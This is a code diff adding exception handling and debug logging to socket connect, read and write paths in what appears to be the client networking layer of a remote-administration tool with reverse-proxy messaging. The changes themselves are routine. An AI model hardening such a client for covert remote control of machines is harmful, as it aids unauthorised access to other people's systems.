@@ -6,6 +6,8 @@ using Pulsar.Common.Messages.ReverseProxy;
 using Pulsar.Common.Networking;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Security;
@@ -266,7 +268,16 @@ namespace Pulsar.Client.Networking
 
                 handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                 handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
-                handle.Connect(ip, port);
+                try
+                {
+                    handle.Connect(ip, port);
+                }
+                catch (SocketException ex)
+                {
+                    Debug.WriteLine($"Connection refused: {ex.Message}");
+                }
+
+
 
                 if (handle.Connected)
                 {
@@ -317,7 +328,7 @@ namespace Pulsar.Client.Networking
                 bytesTransferred = _stream.EndRead(result);
 
                 if (bytesTransferred <= 0)
-                    throw new Exception("no bytes transferred");
+                    return;
             }
             catch (NullReferenceException)
             {
@@ -565,8 +576,21 @@ namespace Pulsar.Client.Networking
                     OnClientWrite(message, pw.WriteMessage(message));
                 }
             }
+            catch (IOException ex)
+            {
+                Debug.WriteLine($"IOException: {ex.Message}");
+                Disconnect();
+                SendCleanup(true);
+            }
+            catch (SocketException ex)
+            {
+                Debug.WriteLine($"SocketException: {ex.Message}");
+                Disconnect();
+                SendCleanup(true);
+            }
             catch (Exception ex)
             {
+                Debug.WriteLine($"Exception: {ex.Message}");
                 Disconnect();
                 SendCleanup(true);
             }
